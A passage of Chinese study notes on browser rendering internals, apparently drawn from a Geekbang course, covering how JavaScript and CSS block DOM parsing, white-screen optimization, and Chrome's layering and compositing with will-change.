alt="image-20221014222548027"></p><p>再接下来，分词器解析出来第一个 EndTag div，这时候 HTML 解析器会去判断当前栈顶的元素是否是 StartTag div，如果是则从栈顶弹出 StartTag div，如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222557660.png" alt="image-20221014222557660"></p><p>按照同样的规则，一路解析，最终结果如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222608775.png" alt="image-20221014222608775"></p><p>通过上面的介绍，相信你已经清楚 DOM 是怎么生成的了。不过在实际生产环境中，HTML 源文件中既包含 CSS 和 JavaScript，又包含图片、音频、视频等文件，所以处理过程远比上面这个示范 Demo 复杂。不过理解了这个简单的 Demo 生成过程，我们就可以往下分析更加复杂的场景了。</p><h3 id="JavaScript-是如何影响-DOM-生成的"><a href="#JavaScript-是如何影响-DOM-生成的" class="headerlink" title="JavaScript 是如何影响 DOM 生成的"></a>JavaScript 是如何影响 DOM 生成的</h3><p>我们再来看看稍微复杂点的 HTML 文件，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]</span><br><span class="line">    div1.innerText = &#x27;time.geekbang&#x27;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;div&gt;test&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>我在两段 div 中间插入了一段 JavaScript 脚本，这段脚本的解析过程就有点不一样了。<code>&lt;script&gt;</code>标签之前，所有的解析流程还是和之前介绍的一样，但是解析到<code>&lt;script&gt;</code>标签时，渲染引擎判断这是一段脚本，此时 HTML 解析器就会暂停 DOM 的解析，因为接下来的 JavaScript 可能要修改当前已经生成的 DOM 结构。</p><p>通过前面 DOM 生成流程分析，我们已经知道当解析到 script 脚本标签时，其 DOM 树结构如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222627658.png" alt="image-20221014222627658"></p><p>这时候 HTML 解析器暂停工作，JavaScript 引擎介入，并执行 script 标签中的这段脚本，因为这段 JavaScript 脚本修改了 DOM 中第一个 div 中的内容，所以执行这段脚本之后，div 节点内容已经修改为 time.geekbang 了。脚本执行完成之后，HTML 解析器恢复解析过程，继续解析后续的内容，直至生成最终的 DOM。</p><p>以上过程应该还是比较好理解的，不过除了在页面中直接内嵌 JavaScript 脚本之外，我们还通常需要在页面中引入 JavaScript 文件，这个解析过程就稍微复杂了些，如下面代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//foo.js</span><br><span class="line">let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]</span><br><span class="line">div1.innerText = &#x27;time.geekbang&#x27;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;script type=&quot;text/javascript&quot; src=&#x27;foo.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;div&gt;test&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这段代码的功能还是和前面那段代码是一样的，不过这里我把内嵌 JavaScript 脚本修改成了通过 JavaScript 文件加载。其整个执行流程还是一样的，执行到 JavaScript 标签时，暂停整个 DOM 的解析，执行 JavaScript 代码，不过这里执行 JavaScript 时，需要先下载这段 JavaScript 代码。这里需要重点关注下载环境，因为<strong>JavaScript 文件的下载过程会阻塞 DOM 解析</strong>，而通常下载又是非常耗时的，会受到网络环境、JavaScript 文件大小等因素的影响。</p><p>不过 Chrome 浏览器做了很多优化，其中一个主要的优化是<strong>预解析操作</strong>。当渲染引擎收到字节流之后，会开启一个预解析线程，用来分析 HTML 文件中包含的 JavaScript、CSS 等相关文件，解析到相关文件之后，预解析线程会提前下载这些文件。</p><p>再回到 DOM 解析上，我们知道引入 JavaScript 线程会阻塞 DOM，不过也有一些相关的策略来规避，比如使用 CDN 来加速 JavaScript 文件的加载，压缩 JavaScript 文件的体积。另外，如果 JavaScript 文件中没有操作 DOM 相关代码，就可以将该 JavaScript 脚本设置为异步加载，通过 async 或 defer 来标记代码，使用方式如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;script async type=&quot;text/javascript&quot; src=&#x27;foo.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">复制代码</span><br><span class="line">&lt;script defer type=&quot;text/javascript&quot; src=&#x27;foo.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>async 和 defer 虽然都是异步的，不过还有一些差异，使用 async 标志的脚本文件一旦加载完成，会立即执行；而使用了 defer 标记的脚本文件，需要在 DOMContentLoaded 事件之前执行。</p><p>现在我们知道了 JavaScript 是如何阻塞 DOM 解析的了，那接下来我们再来结合文中代码看看另外一种情况：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//theme.css</span><br><span class="line">div &#123;color:blue&#125;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;style src=&#x27;theme.css&#x27;&gt;&lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;1&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">            let div1 = document.getElementsByTagName(&#x27;div&#x27;)[0]</span><br><span class="line">            div1.innerText = &#x27;time.geekbang&#x27; // 需要 DOM</span><br><span class="line">            div1.style.color = &#x27;red&#x27;  // 需要 CSSOM</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;div&gt;test&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>该示例中，JavaScript 代码出现了 <code>div1.style.color = ‘red&#39;</code> 的语句，它是用来操纵 CSSOM 的，所以在执行 JavaScript 之前，需要先解析 JavaScript 语句之上所有的 CSS 样式。所以如果代码里引用了外部的 CSS 文件，那么在执行 JavaScript 之前，还需要等待外部的 CSS 文件下载完成，并解析生成 CSSOM 对象之后，才能执行 JavaScript 脚本。</p><p>而 JavaScript 引擎在解析 JavaScript 之前，是不知道 JavaScript 是否操纵了 CSSOM 的，所以渲染引擎在遇到 JavaScript 脚本时，不管该脚本是否操纵了 CSSOM，都会执行 CSS 文件下载，解析操作，再执行 JavaScript 脚本。</p><p>所以说 JavaScript 脚本是依赖样式表的，这又多了一个阻塞过程。至于如何优化，我们在下篇文章中再来深入探讨。</p><p>通过上面的分析，我们知道了 JavaScript 会阻塞 DOM 生成，而样式文件又会阻塞 JavaScript 的执行，所以在实际的工程中需要重点关注 JavaScript 文件和样式表文件，使用不当会影响到页面性能的。</p><h3 id="总结-21"><a href="#总结-21" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就讲到这里，下面我来总结下今天的内容。</p><p>首先我们介绍了 DOM 是如何生成的，然后又基于 DOM 的生成过程分析了 JavaScript 是如何影响到 DOM 生成的。因为 CSS 和 JavaScript 都会影响到 DOM 的生成，所以我们又介绍了一些加速生成 DOM 的方案，理解了这些，能让你更加深刻地理解如何去优化首次页面渲染。</p><p>额外说明一下，渲染引擎还有一个安全检查模块叫 XSSAuditor，是用来检测词法安全的。在分词器解析出来 Token 之后，它会检测这些模块是否安全，比如是否引用了外部脚本，是否符合 CSP 规范，是否存在跨站点请求等。如果出现不符合规范的内容，XSSAuditor 会对该脚本或者下载任务进行拦截。详细内容我们会在后面的安全模块介绍，这里就不赘述了。</p><h2 id="3-渲染流水线：CSS-如何影响首次加载时的白屏时间？"><a href="#3-渲染流水线：CSS-如何影响首次加载时的白屏时间？" class="headerlink" title="3. 渲染流水线：CSS 如何影响首次加载时的白屏时间？"></a>3. 渲染流水线：CSS 如何影响首次加载时的白屏时间？</h2><p>在<a href="https://time.geekbang.org/column/article/140140">上一篇文章</a>中我们详细介绍了 DOM 的生成过程，并结合具体例子分析了 JavaScript 是如何阻塞 DOM 生成的。那本文我们就继续深入聊聊渲染流水线中的 CSS。因为 CSS 是页面中非常重要的资源，它决定了页面最终显示出来的效果，并影响着用户对整个网站的第一体验。所以，搞清楚浏览器中的 CSS 是怎么工作的很有必要，只有理解了 CSS 是如何工作的，你才能更加深刻地理解如何去优化页面。</p><p>本文我们先站在渲染流水线的视角来介绍 CSS 是如何工作的，然后通过 CSS 的工作流程来分析性能瓶颈，最后再来讨论如何减少首次加载时的白屏时间。</p><h3 id="渲染流水线视角下的-CSS"><a href="#渲染流水线视角下的-CSS" class="headerlink" title="渲染流水线视角下的 CSS"></a>渲染流水线视角下的 CSS</h3><p>我们先结合下面代码来看看最简单的渲染流程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//theme.css</span><br><span class="line">div&#123;</span><br><span class="line">    color : coral;</span><br><span class="line">    background-color:black</span><br><span class="line">&#125;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=&quot;theme.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;geekbang com&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这两段代码分别由 CSS 文件和 HTML 文件构成，我们来分析下打开这段 HTML 文件时的渲染流水线，你可以先参考下面这张渲染流水线示意图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222658135.png" alt="image-20221014222658135"></p><p>下面我们结合上图来分析这个页面文件的渲染流水线。</p><p>首先是发起主页面的请求，这个发起请求方可能是渲染进程，也有可能是浏览器进程，发起的请求被送到网络进程中去执行。网络进程接收到返回的 HTML 数据之后，将其发送给渲染进程，渲染进程会解析 HTML 数据并构建 DOM。这里你需要特别注意下，请求 HTML 数据和构建 DOM 中间有一段空闲时间，这个空闲时间有可能成为页面渲染的瓶颈。</p><p><a href="https://time.geekbang.org/column/article/140140">上一篇文章</a>中我们提到过，当渲染进程接收 HTML 文件字节流时，会先开启一个<strong>预解析线程</strong>，如果遇到 JavaScript 文件或者 CSS 文件，那么预解析线程会提前下载这些数据。对于上面的代码，预解析线程会解析出来一个外部的 theme.css 文件，并发起 theme.css 的下载。这里也有一个空闲时间需要你注意一下，就是在 DOM 构建结束之后、theme.css 文件还未下载完成的这段时间内，渲染流水线无事可做，因为下一步是合成布局树，而合成布局树需要 CSSOM 和 DOM，所以这里需要等待 CSS 加载结束并解析成 CSSOM。</p><p><strong>那渲染流水线为什么需要 CSSOM 呢？</strong></p><p>和 HTML 一样，渲染引擎也是无法直接理解 CSS 文件内容的，所以需要将其解析成渲染引擎能够理解的结构，这个结构就是 CSSOM。和 DOM 一样，CSSOM 也具有两个作用，<strong>第一个是提供给 JavaScript 操作样式表的能力，第二个是为布局树的合成提供基础的样式信息</strong>。这个 CSSOM 体现在 DOM 中就是<code>document.styleSheets</code>。具体结构你可以去查阅相关资料，这里我就不过多介绍了，你知道 CSSOM 的两个作用是怎样的就行了。</p><p>有了 DOM 和 CSSOM，接下来就可以合成布局树了，我们在前面<a href="https://time.geekbang.org/column/article/118205">《05 | 渲染流程（上）：HTML、CSS 和 JavaScript 文件，是如何变成页面的？》</a>这篇文章中讲解过布局树的构造过程，这里咱们再简单回顾下。等 DOM 和 CSSOM 都构建好之后，渲染引擎就会构造布局树。布局树的结构基本上就是复制 DOM 树的结构，不同之处在于 DOM 树中那些不需要显示的元素会被过滤掉，如 display:none 属性的元素、head 标签、script 标签等。复制好基本的布局树结构之后，渲染引擎会为对应的 DOM 元素选择对应的样式信息，这个过程就是<strong>样式计算</strong>。样式计算完成之后，渲染引擎还需要计算布局树中每个元素对应的几何位置，这个过程就是<strong>计算布局</strong>。通过样式计算和计算布局就完成了最终布局树的构建。再之后，就该进行后续的绘制操作了。</p><p>这就是在渲染过程中涉及到 CSS 的一些主要流程。</p><p>了解了这些之后，我们再来看看稍微复杂一点的场景，还是看下面这段 HTML 代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//theme.css</span><br><span class="line">div&#123;</span><br><span class="line">    color : coral;</span><br><span class="line">    background-color:black</span><br><span class="line">&#125;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=&quot;theme.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;geekbang com&lt;/div&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        console.log(&#x27;time.geekbang.org&#x27;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">    &lt;div&gt;geekbang com&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这段代码是我在开头代码的基础之上做了一点小修改，在 body 标签内部加了一个简单的 JavaScript。有了 JavaScript，渲染流水线就有点不一样了，可以参考下面这张渲染流水线图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222715116.png" alt="image-20221014222715116"></p><p>那我们就结合这张图来分析含有外部 CSS 文件和 JavaScript 代码的页面渲染流水线，<a href="https://time.geekbang.org/column/article/140140">上一篇文章</a>中我们提到过在解析 DOM 的过程中，如果遇到了 JavaScript 脚本，那么需要先暂停 DOM 解析去执行 JavaScript，因为 JavaScript 有可能会修改当前状态下的 DOM。</p><p>不过在执行 JavaScript 脚本之前，如果页面中包含了外部 CSS 文件的引用，或者通过 style 标签内置了 CSS 内容，那么渲染引擎还需要将这些内容转换为 CSSOM，因为 JavaScript 有修改 CSSOM 的能力，所以在执行 JavaScript 之前，还需要依赖 CSSOM。也就是说 CSS 在部分情况下也会阻塞 DOM 的生成。</p><p>我们再来看看更加复杂一点的情况，如果在 body 中被包含的是 JavaScript 外部引用文件，Demo 代码如下所示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//theme.css</span><br><span class="line">div&#123;</span><br><span class="line">    color : coral;</span><br><span class="line">    background-color:black</span><br><span class="line">&#125;</span><br><span class="line">//foo.js</span><br><span class="line">console.log(&#x27;time.geekbang.org&#x27;)</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=&quot;theme.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div&gt;geekbang com&lt;/div&gt;</span><br><span class="line">    &lt;script src=&#x27;foo.js&#x27;&gt;&lt;/script&gt;</span><br><span class="line">    &lt;div&gt;geekbang com&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>从上面代码可以看出来，HTML 文件中包含了 CSS 的外部引用和 JavaScript 外部文件，那它们的渲染流水线是怎样的呢？可参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014222725905.png" alt="image-20221014222725905"></p><p>从图中可以看出来，在接收到 HTML 数据之后的预解析过程中，HTML 预解析器识别出来了有 CSS 文件和 JavaScript 文件需要下载，然后就同时发起这两个文件的下载请求，需要注意的是，这两个文件的下载过程是重叠的，所以下载时间按照最久的那个文件来算。</p><p>后面的流水线就和前面是一样的了，不管 CSS 文件和 JavaScript 文件谁先到达，都要先等到 CSS 文件下载完成并生成 CSSOM，然后再执行 JavaScript 脚本，最后再继续构建 DOM，构建布局树，绘制页面。</p><h3 id="影响页面展示的因素以及优化策略"><a href="#影响页面展示的因素以及优化策略" class="headerlink" title="影响页面展示的因素以及优化策略"></a>影响页面展示的因素以及优化策略</h3><p>前面我们为什么要花这么多文字来分析渲染流水线呢？主要原因就是<strong>渲染流水线影响到了首次页面展示的速度，而首次页面展示的速度又直接影响到了用户体验</strong>，所以我们分析渲染流水线的目的就是为了找出一些影响到首屏展示的因素，然后再基于这些因素做一些针对性的调整。</p><p>那么接下来我们就来看看从发起 URL 请求开始，到首次显示页面的内容，在视觉上经历的三个阶段。</p><ul><li>第一个阶段，等请求发出去之后，到提交数据阶段，这时页面展示出来的还是之前页面的内容。关于提交数据你可以参考前面<a href="https://time.geekbang.org/column/article/117637">《04 | 导航流程：从输入 URL 到页面展示，这中间发生了什么？》</a>这篇文章。</li><li>第二个阶段，提交数据之后渲染进程会创建一个空白页面，我们通常把这段时间称为<strong>解析白屏</strong>，并等待 CSS 文件和 JavaScript 文件的加载完成，生成 CSSOM 和 DOM，然后合成布局树，最后还要经过一系列的步骤准备首次渲染。</li><li>第三个阶段，等首次渲染完成之后，就开始进入完整页面的生成阶段了，然后页面会一点点被绘制出来。</li></ul><p>影响第一个阶段的因素主要是网络或者是服务器处理这块儿，前面文章中我们已经讲过了，这里我们就不再继续分析了。至于第三个阶段，我们会在后续文章中分析，所以这里也不做介绍了。</p><p>现在我们重点关注第二个阶段，这个阶段的主要问题是白屏时间，如果白屏时间过久，就会影响到用户体验。为了缩短白屏时间，我们来挨个分析这个阶段的主要任务，包括了解析 HTML、下载 CSS、下载 JavaScript、生成 CSSOM、执行 JavaScript、生成布局树、绘制页面一系列操作。</p><p>通常情况下的瓶颈主要体现在<strong>下载 CSS 文件、下载 JavaScript 文件和执行 JavaScript</strong>。</p><p>所以要想缩短白屏时长，可以有以下策略：</p><ul><li>通过内联 JavaScript、内联 CSS 来移除这两种类型的文件下载，这样获取到 HTML 文件之后就可以直接开始渲染流程了。</li><li>但并不是所有的场合都适合内联，那么还可以尽量减少文件大小，比如通过 webpack 等工具移除一些不必要的注释，并压缩 JavaScript 文件。</li><li>还可以将一些不需要在解析 HTML 阶段使用的 JavaScript 标记上 sync 或者 defer。</li><li>对于大的 CSS 文件，可以通过媒体查询属性，将其拆分为多个不同用途的 CSS 文件，这样只有在特定的场景下才会加载特定的 CSS 文件。</li></ul><p>通过以上策略就能缩短白屏展示的时长了，不过在实际项目中，总是存在各种各样的情况，这些策略并不能随心所欲地去引用，所以还需要结合实际情况来调整最佳方案。</p><h3 id="总结-22"><a href="#总结-22" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下今天的内容。</p><p>我们首先介绍了 CSS 在渲染流水线中的位置，以及 CSS 是如何影响到渲染流程的；接下来我们通过渲染流水线分析了从发出请求到页面首次绘制的三个阶段；最后重点介绍了第二个白屏阶段以及优化该阶段的一些策略。</p><p>通过今天的内容我们可以知道虽然 JavaScript 和 CSS 给我们带来了极大的便利，不过也对页面的渲染带来了很多的限制，所以我们要关注资源加载速度，需要小心翼翼地处理各种资源之间的关联关系。</p><h2 id="4-分层和合成机制：为什么-CSS-动画比-JavaScript-高效？"><a href="#4-分层和合成机制：为什么-CSS-动画比-JavaScript-高效？" class="headerlink" title="4. 分层和合成机制：为什么 CSS 动画比 JavaScript 高效？"></a>4. 分层和合成机制：为什么 CSS 动画比 JavaScript 高效？</h2><p>在<a href="https://time.geekbang.org/column/article/140703">上一篇文章</a>中我们分析了 CSS 和 JavaScript 是如何影响到 DOM 树生成的，今天我们继续沿着渲染流水线向下分析，来聊聊 DOM 树之后所发生的事情。</p><p>在前面<a href="https://time.geekbang.org/column/article/118205">《05 | 渲染流程（上）：HTML、CSS 和 JavaScript 文件，是如何变成页面的？》</a>文章中，我们介绍过 DOM 树生成之后，还要经历布局、分层、绘制、合成、显示等阶段后才能显示出漂亮的页面。</p><p>本文我们主要讲解渲染引擎的分层和合成机制，因为分层和合成机制代表了浏览器最为先进的合成技术，Chrome 团队为了做到这一点，做了大量的优化工作。了解其工作原理，有助于拓宽你的视野，而且也有助于你更加深刻地理解 CSS 动画和 JavaScript 底层工作机制。</p><h3 id="显示器是怎么显示图像的"><a href="#显示器是怎么显示图像的" class="headerlink" title="显示器是怎么显示图像的"></a>显示器是怎么显示图像的</h3><p>每个显示器都有固定的刷新频率，通常是 60HZ，也就是每秒更新 60 张图片，更新的图片都来自于显卡中一个叫<strong>前缓冲区</strong>的地方，显示器所做的任务很简单，就是每秒固定读取 60 次前缓冲区中的图像，并将读取的图像显示到显示器上。</p><p><strong>那么这里显卡做什么呢？</strong></p><p>显卡的职责就是合成新的图像，并将图像保存到<strong>后缓冲区</strong>中，一旦显卡把合成的图像写到后缓冲区，系统就会让后缓冲区和前缓冲区互换，这样就能保证显示器能读取到最新显卡合成的图像。通常情况下，显卡的更新频率和显示器的刷新频率是一致的。但有时候，在一些复杂的场景中，显卡处理一张图片的速度会变慢，这样就会造成视觉上的卡顿。</p><h3 id="帧-VS-帧率"><a href="#帧-VS-帧率" class="headerlink" title="帧 VS 帧率"></a>帧 VS 帧率</h3><p>了解了显示器是怎么显示图像的之后，下面我们再来明确下帧和帧率的概念，因为这是后续一切分析的基础。</p><p>当你通过滚动条滚动页面，或者通过手势缩放页面时，屏幕上就会产生动画的效果。之所以你能感觉到有动画的效果，是因为在滚动或者缩放操作时，渲染引擎会通过渲染流水线生成新的图片，并发送到显卡的后缓冲区。</p><p>大多数设备屏幕的更新频率是 60 次 &#x2F; 秒，这也就意味着正常情况下要实现流畅的动画效果，渲染引擎需要每秒更新 60 张图片到显卡的后缓冲区。</p><p>我们把渲染流水线生成的每一副图片称为一帧，把渲染流水线每秒更新了多少帧称为帧率，比如滚动过程中 1 秒更新了 60 帧，那么帧率就是 60Hz（或者 60FPS）。</p><p>由于用户很容易观察到那些丢失的帧，如果在一次动画过程中，渲染引擎生成某些帧的时间过久，那么用户就会感受到卡顿，这会给用户造成非常不好的印象。</p><p>要解决卡顿问题，就要解决每帧生成时间过久的问题，为此 Chrome 对浏览器渲染方式做了大量的工作，其中最卓有成效的策略就是引入了分层和合成机制。分层和合成机制代表了当今最先进的渲染技术，所以接下来我们就来分析下什么是合成和渲染技术。</p><h3 id="如何生成一帧图像"><a href="#如何生成一帧图像" class="headerlink" title="如何生成一帧图像"></a>如何生成一帧图像</h3><p>不过在开始之前，我们还需要聊一聊渲染引擎是如何生成一帧图像的。这需要回顾下我们前面<a href="https://time.geekbang.org/column/article/118826">《06 | 渲染流程（下）：HTML、CSS 和 JavaScript 文件，是如何变成页面的？》</a>介绍的渲染流水线。关于其中任意一帧的生成方式，有<strong>重排、重绘</strong>和<strong>合成</strong>三种方式。</p><p>这三种方式的渲染路径是不同的，<strong>通常渲染路径越长，生成图像花费的时间就越多</strong>。比如<strong>重排</strong>，它需要重新根据 CSSOM 和 DOM 来计算布局树，这样生成一幅图片时，会让整个渲染流水线的每个阶段都执行一遍，如果布局复杂的话，就很难保证渲染的效率了。而<strong>重绘</strong>因为没有了重新布局的阶段，操作效率稍微高点，但是依然需要重新计算绘制信息，并触发绘制操作之后的一系列操作。</p><p>相较于重排和重绘，<strong>合成</strong>操作的路径就显得非常短了，并不需要触发布局和绘制两个阶段，如果采用了 GPU，那么合成的效率会非常高。</p><p>所以，关于渲染引擎生成一帧图像的几种方式，按照效率我们推荐合成方式优先，若实在不能满足需求，那么就再退后一步使用重绘或者重排的方式。</p><p>本文我们的焦点在合成上，所以接下来我们就来深入分析下 Chrome 浏览器是怎么实现合成操作的。Chrome 中的合成技术，可以用三个词来概括总结：<strong>分层、分块</strong>和<strong>合成</strong>。</p><h3 id="分层和合成"><a href="#分层和合成" class="headerlink" title="分层和合成"></a>分层和合成</h3><p>通常页面的组成是非常复杂的，有的页面里要实现一些复杂的动画效果，比如点击菜单时弹出菜单的动画特效，滚动鼠标滚轮时页面滚动的动画效果，当然还有一些炫酷的 3D 动画特效。如果没有采用分层机制，从布局树直接生成目标图片的话，那么每次页面有很小的变化时，都会触发重排或者重绘机制，这种“牵一发而动全身”的绘制策略会严重影响页面的渲染效率。</p><p><strong>为了提升每帧的渲染效率，Chrome 引入了分层和合成的机制。那该怎么来理解分层和合成机制呢？</strong></p><p>你可以把一张网页想象成是由很多个图片叠加在一起的，每个图片就对应一个图层，Chrome 合成器最终将这些图层合成了用于显示页面的图片。如果你熟悉 PhotoShop 的话，就能很好地理解这个过程了，PhotoShop 中一个项目是由很多图层构成的，每个图层都可以是一张单独图片，可以设置透明度、边框阴影，可以旋转或者设置图层的上下位置，将这些图层叠加在一起后，就能呈现出最终的图片了。</p><p>在这个过程中，将素材分解为多个图层的操作就称为<strong>分层</strong>，最后将这些图层合并到一起的操作就称为<strong>合成</strong>。所以，分层和合成通常是一起使用的。</p><p>考虑到一个页面被划分为两个层，当进行到下一帧的渲染时，上面的一帧可能需要实现某些变换，如平移、旋转、缩放、阴影或者 Alpha 渐变，这时候合成器只需要将两个层进行相应的变化操作就可以了，显卡处理这些操作驾轻就熟，所以这个合成过程时间非常短。</p><p><strong>理解了为什么要引入合成和分层机制，下面我们再来看看 Chrome 是怎么实现分层和合成机制的。</strong></p><p>在 Chrome 的渲染流水线中，<strong>分层体现在生成布局树之后</strong>，渲染引擎会根据布局树的特点将其转换为层树（Layer Tree），层树是渲染流水线后续流程的基础结构。</p><p>层树中的每个节点都对应着一个图层，下一步的绘制阶段就依赖于层树中的节点。在<a href="https://time.geekbang.org/column/article/118826">《06 | 渲染流程（下）：HTML、CSS 和 JavaScript 文件，是如何变成页面的？》</a>中我们介绍过，绘制阶段其实并不是真正地绘出图片，而是将绘制指令组合成一个列表，比如一个图层要设置的背景为黑色，并且还要在中间画一个圆形，那么绘制过程会生成<code>|Paint BackGroundColor:Black | Paint Circle|</code>这样的绘制指令列表，绘制过程就完成了。</p><p>有了绘制列表之后，就需要进入光栅化阶段了，光栅化就是按照绘制列表中的指令生成图片。每一个图层都对应一张图片，合成线程有了这些图片之后，会将这些图片合成为“一张”图片，并最终将生成的图片发送到后缓冲区。这就是一个大致的分层、合成流程。</p><p><strong>需要重点关注的是，合成操作是在合成线程上完成的，这也就意味着在执行合成操作时，是不会影响到主线程执行的</strong>。这就是为什么经常主线程卡住了，但是 CSS 动画依然能执行的原因。</p><h3 id="分块"><a href="#分块" class="headerlink" title="分块"></a>分块</h3><p>如果说分层是从宏观上提升了渲染效率，那么分块则是从微观层面提升了渲染效率。</p><p>通常情况下，页面的内容都要比屏幕大得多，显示一个页面时，如果等待所有的图层都生成完毕，再进行合成的话，会产生一些不必要的开销，也会让合成图片的时间变得更久。</p><p>因此，合成线程会将每个图层分割为大小固定的图块，然后优先绘制靠近视口的图块，这样就可以大大加速页面的显示速度。不过有时候， 即使只绘制那些优先级最高的图块，也要耗费不少的时间，因为涉及到一个很关键的因素——<strong>纹理上传</strong>，这是因为从计算机内存上传到 GPU 内存的操作会比较慢。</p><p>为了解决这个问题，Chrome 又采取了一个策略：<strong>在首次合成图块的时候使用一个低分辨率的图片</strong>。比如可以是正常分辨率的一半，分辨率减少一半，纹理就减少了四分之三。在首次显示页面内容的时候，将这个低分辨率的图片显示出来，然后合成器继续绘制正常比例的网页内容，当正常比例的网页内容绘制完成后，再替换掉当前显示的低分辨率内容。这种方式尽管会让用户在开始时看到的是低分辨率的内容，但是也比用户在开始时什么都看不到要好。</p><h3 id="如何利用分层技术优化代码"><a href="#如何利用分层技术优化代码" class="headerlink" title="如何利用分层技术优化代码"></a>如何利用分层技术优化代码</h3><p>通过上面的介绍，相信你已经理解了渲染引擎是怎么将布局树转换为漂亮图片的，理解其中原理之后，你就可以利用分层和合成技术来优化代码了。</p><p>在写 Web 应用的时候，你可能经常需要对某个元素做几何形状变换、透明度变换或者一些缩放操作，如果使用 JavaScript 来写这些效果，会牵涉到整个渲染流水线，所以 JavaScript 的绘制效率会非常低下。</p><p>这时你可以使用 will-change 来告诉渲染引擎你会对该元素做一些特效变换，CSS 代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.box &#123;</span><br><span class="line">will-change: transform, opacity;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码就是提前告诉渲染引擎 box 元素将要做几何变换和透明度变换操作，这时候渲染引擎会将该元素单独实现一帧，等这些变换发生时，渲染引擎会通过合成线程直接去处理变换，这些变换并没有涉及到主线程，这样就大大提升了渲染的效率。<strong>这也是 CSS 动画比 JavaScript 动画高效的原因</strong>。</p><p>所以，如果涉及到一些可以使用合成线程来处理 CSS 特效或者动画的情况，就尽量使用 will-change 来提前告诉渲染引擎，让它为该元素准备独立的层。但是凡事都有两面性，每当渲染引擎为一个元素准备一个独立层的时候，它占用的内存也会大大增加，因为从层树开始，后续每个阶段都会多一个层结构，这些都需要额外的内存，所以你需要恰当地使用 will-change。</p><h3 id="总结-23"><a href="#总结-23" class="headerlink" title="总结"></a>总结</h3><p>好了，今天就介绍到这里，下面我来总结下今天的内容。</p><ul><li>首先我们介绍了显示器显示图像的原理，以及帧和帧率的概念，然后基于帧和帧率我们又介绍渲染引擎是如何实现一帧图像的。通常渲染引擎生成一帧图像有三种方式：重排、重绘和合成。其中重排和重绘操作都是在渲染进程的主线程上执行的，比较耗时；而合成操作是在渲染进程的合成线程上执行的，执行速度快，且不占用主线程。</li><li>然后我们重点介绍了浏览器是怎么实现合成的，其技术细节主要可以使用三个词来概括：分层、分块和合成。</li><li>最后我们还讲解了 CSS 动画比 JavaScript 动画高效的原因，以及怎么使用 will-change 来优化动画或特效。</li></ul><h2 id="5-页面性能：如何系统地优化页面？"><a href="#5-页面性能：如何系统地优化页面？" class="headerlink" title="5. 页面性能：如何系统地优化页面？"></a>5. 